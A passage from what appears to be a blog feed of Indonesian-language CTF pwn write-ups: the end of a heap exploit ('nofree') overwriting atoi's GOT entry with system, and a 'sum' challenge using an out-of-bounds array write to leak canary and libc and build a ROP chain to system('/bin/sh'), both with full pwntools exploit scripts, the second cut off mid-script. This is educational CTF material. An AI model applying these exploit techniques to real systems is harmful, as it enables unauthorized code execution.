+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x150</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xFFFFFFFF</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+</code></pre></div><p>Kita perlu melakukan kalkulasi size untuk menentukan target agar malloc mengembalikan nilai di address yang kita inginkan. Disini digunakanlah fungsi <code>feedback</code>, karena bisa merequest nilai malloc secara bebas. Saya menggunakan target pada bss yaitu pada <code>list</code> (0x804b0a0).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b0a0</span>
+    evil <span style="color:#f92672">=</span> target<span style="color:#f92672">-</span>top_chunk<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+    feedback(evil, <span style="color:#e6db74">&#39;&#39;</span>)
+</code></pre></div><p>Lalu saya mengubah list pertama menjadi nilai sebelum got atoi dikurang 4. Dan ketika di view libc atoi address akan terleak.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    add(<span style="color:#ae81ff">0x20</span>,  <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>  <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Name: &#39;</span>)
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+</code></pre></div><p>Write got atoi dengan system, setelah itu pada pemilihan menu tinggal kirim <code>/bin/sh</code> lalu akan mendapatkan shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    edit(<span style="color:#ae81ff">0</span>, p32(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]), <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+</code></pre></div><h2 id="full-exploit-code">Full Exploit Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc chall.codepwnda.id 17012&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+    con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+    PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+<span style="color:#75715e"># context.terminal = &#39;gnome-terminal -e&#39;.split()</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tmux splitw -h -p 70&#39;</span><span style="color:#f92672">.</span>split()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size, name, content):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Name size: &#39;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Name: &#39;</span>, name)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Content: &#39;</span>, content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(index):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index : &#39;</span>, str(index))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index, name, content):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Index: &#39;</span>, str(index))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;Name: &#39;</span>, name)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Content: &#39;</span>, content)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit_profile</span>(name):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;5&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;username: &#39;</span>, name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">feedback</span>(size, msg):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;6&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;size: &#39;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Feedback: &#39;</span>, msg)
+
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.23.so&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+
+    target <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804b0a0</span>
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;username: &#39;</span>, <span style="color:#e6db74">&#39;camelliose&#39;</span>)
+    add(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    edit_profile(<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">30</span>)
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">255</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;@&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;@&#39;</span>)
+    heap_base <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x18</span>
+    top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x180</span>
+    
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;target @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(target)))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;heap_base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(heap_base)))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;top_chunk @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(top_chunk)))
+
+    edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x150</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xFFFFFFFF</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+
+
+    evil <span style="color:#f92672">=</span> target<span style="color:#f92672">-</span>top_chunk<span style="color:#f92672">-</span><span style="color:#ae81ff">16</span>
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;evil size : {}&#39;</span><span style="color:#f92672">.</span>format(evil))
+    feedback(evil, <span style="color:#e6db74">&#39;&#39;</span>)
+
+    add(<span style="color:#ae81ff">0x20</span>,  <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>  <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;atoi&#39;</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>), <span style="color:#e6db74">&#39;a&#39;</span>)
+    view(<span style="color:#ae81ff">0</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;Name: &#39;</span>)
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u32(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;atoi&#39;</span>]
+
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;libc base @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(libc<span style="color:#f92672">.</span>address)))
+
+    edit(<span style="color:#ae81ff">0</span>, p32(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]), <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;#&gt; &#39;</span>, <span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+
+    p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+            p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+            cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">            b*edit
+</span><span style="color:#e6db74">            &#39;&#39;&#39;</span>
+            gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><p><img src="/img/nofree-5.png" alt="image alt text"></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hacktoday 2020 (Quals) - sum</title>
+            <link>https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/</link>
+            <pubDate>Tue, 11 Aug 2020 21:43:36 +0700</pubDate>
+            
+            <guid>https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/</guid>
+            <description>Overview Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:
+Berikut hasil dekompilasi fungsi main:
+int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp+1Fh] [rbp-61h]  int v5; // [rsp+20h] [rbp-60h]  int i; // [rsp+24h] [rbp-5Ch]  __int64 v7; // [rsp+28h] [rbp-58h]  int s[18]; // [rsp+30h] [rbp-50h]  unsigned __int64 v9; // [rsp+78h] [rbp-8h]  v9 = __readfsqword(0x28u); v7 = 0LL; init(*(_QWORD *)&amp;amp;argc, argv, envp); banner(); do { v7 = 0LL; memset(s, 0, 0x40uLL); printf(&amp;#34;n: &amp;#34;, 0LL); __isoc99_scanf(&amp;#34;%d&amp;#34;, &amp;amp;v5); for ( i = 0; i &amp;lt; v5; ++i ) { printf(&amp;#34;%d.</description>
+            <content type="html"><![CDATA[<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h2 id="overview">Overview</h2>
+<p>Diberikan sebuah file libc 2.31 dan binary dengan proteksi sebagai berikut:</p>
+<p><img src="/img/sum-2.png" alt="image alt text"></p>
+<p>Berikut hasil dekompilasi fungsi main:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+{
+  <span style="color:#66d9ef">char</span> v4; <span style="color:#75715e">// [rsp+1Fh] [rbp-61h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+20h] [rbp-60h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+24h] [rbp-5Ch]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v7; <span style="color:#75715e">// [rsp+28h] [rbp-58h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> s[<span style="color:#ae81ff">18</span>]; <span style="color:#75715e">// [rsp+30h] [rbp-50h]
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v9; <span style="color:#75715e">// [rsp+78h] [rbp-8h]
+</span><span style="color:#75715e"></span>
+  v9 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
+  v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+  init(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>argc, argv, envp);
+  banner();
+  <span style="color:#66d9ef">do</span>
+  {
+    v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+    memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x40uLL</span>);
+    printf(<span style="color:#e6db74">&#34;n: &#34;</span>, <span style="color:#ae81ff">0LL</span>);
+    __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v5);
+    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> v5; <span style="color:#f92672">++</span>i )
+    {
+      printf(<span style="color:#e6db74">&#34;%d. &#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
+      __isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>s[i]);
+      v7 <span style="color:#f92672">+=</span> s[i];
+    }
+    printf(<span style="color:#e6db74">&#34;= %ld</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>, v7);
+    printf(<span style="color:#e6db74">&#34;[Y/n]? &#34;</span>);
+    <span style="color:#66d9ef">while</span> ( getchar() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;\n&#39;</span> )
+      ;
+    __isoc99_scanf(<span style="color:#e6db74">&#34;%c&#34;</span>, <span style="color:#f92672">&amp;</span>v4);
+  }
+  <span style="color:#66d9ef">while</span> ( v4 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span> <span style="color:#f92672">||</span> v4 <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;Y&#39;</span> );
+  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Program tersebut akan meminta input n, dan n buah bilangan. N buah bilangan tersebut akan disimpan di dalam sebuah array integer. Bilangan-bilangan tersebut akan ditambahkan secara satu persatu ke dalam variabel v7, setelah itu akan mencetak hasil dari penjumlahan bilangan-bilangan tersebut. Dan terakhir, terdapat option apakah akan melakukan perhitungan lagi atau tidak.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Lalu dimana letak vulnerabilitynya? Ya, tidak ada batasan nilai n sehingga dapat menyebabkan out of bound pada array. Dengan begitu kita dapat mengoverwrite saved RIP fungsi main.</p>
+<h2 id="exploit">Exploit</h2>
+<p>Leak dapat dilakukan dengan menginputkan nilai yang bukan angka pada saat bagian yang akan dileak tersebut akan dioverwrite. Pada saat <code>__isoc99_scanf(&quot;%d&quot;, &amp;v5)</code> menerima nilai yang bukan angka (contoh: &lsquo;a&rsquo;, &lsquo;!', dll), maka nilai tersebut tidak akan mengoverwrite sesuatu. Dengan cara itulah kita meleak nantinya, karena bagian yang akan dileak tidak akan teroverwrite dengan apapun. Leak akan dilakukan dengan membagi nilai tersebut secara 4 byte 4 byte, hal itu dilakukan karena program tersebut 64bit sedangkan besar elemen arraynya masing-masing 4 byte. Sebelum memasukkan nilai yang bukan angka, kita masukkan semuanya nol, ini digunakan untuk mempermudah saat leak. Karena jika nol, pada saat leak akan langsung menampilkan nilai leak yang diinginkan dan tidak perlu melakukan kalkulasi lagi. Leak bisa saja bernilai negatif, maka dari itu kita membutuhkan bantuan fungsi <code>c_uint</code> dari library ctypes untuk mengubahnya ke unsigned integer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(offset):
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak1 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak2 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    leak <span style="color:#f92672">=</span> (leak2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> leak1
+
+    <span style="color:#66d9ef">return</span> leak
+</code></pre></div><p>Namun karena binary ini memiliki beberapa proteksi seperti pie dan canary, kita harus leak mereka terlebih dulu.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">   canary <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">18</span>)
+ 
+   libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">22</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x270b3</span>
+ 
+   elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak(<span style="color:#ae81ff">30</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x9d2</span>
+</code></pre></div><p>Setelah mendapatkan leak canary, libc address, dan pie kita dapat menyusun ropchain  untuk memanggil system(“/bin/sh”). Namun sebelum jump ke system kita perlu jump ke instruksi ret terlebih dahulu karena ada misalignment, jika tidak jump ke ret maka akan terjadi segmentation fault.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">    pop_rdi <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0000000000000ba3</span>
+    ret <span style="color:#f92672">=</span> pop_rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+
+    binsh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;/bin/sh&#39;</span>))
+    log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;/bin/sh @ {}&#39;</span><span style="color:#f92672">.</span>format(hex(binsh)))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;30&#39;</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">18</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(canary <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(pop_rdi <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(binsh <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(ret <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFF</span>))
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, str(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span>))
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;n&#39;</span>)
+</code></pre></div><h2 id="full-exploit-code">Full Exploit Code</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+
+con <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nc chall.codepwnda.id 17011&#39;</span>
+
+<span style="color:#66d9ef">if</span>(con):
+    con <span style="color:#f92672">=</span> con<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    HOST <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">1</span>]
+    PORT <span style="color:#f92672">=</span> con[<span style="color:#ae81ff">2</span>]
+
+elf <span style="color:#f92672">=</span> ELF(BINARY, checksec<span style="color:#f92672">=</span>False)
+argv <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv
+<span style="color:#75715e"># context.terminal = &#39;gnome-terminal -e&#39;.split()</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;tmux splitw -h -p 70&#39;</span><span style="color:#f92672">.</span>split()
+<span style="color:#75715e">#context.log_level = &#39;DEBUG&#39;</span>
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>, checksec<span style="color:#f92672">=</span>False)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(offset):
+    
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak1 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;n: &#39;</span>, <span style="color:#e6db74">&#39;{}&#39;</span><span style="color:#f92672">.</span>format(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>))
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+        p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;. &#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;= &#39;</span>)
+    leak2 <span style="color:#f92672">=</span> c_uint(int(p<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>), <span style="color:#ae81ff">10</span>))<span style="color:#f92672">.</span>value
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;?&#39;</span>, <span style="color:#e6db74">&#39;y&#39;</span>)
+
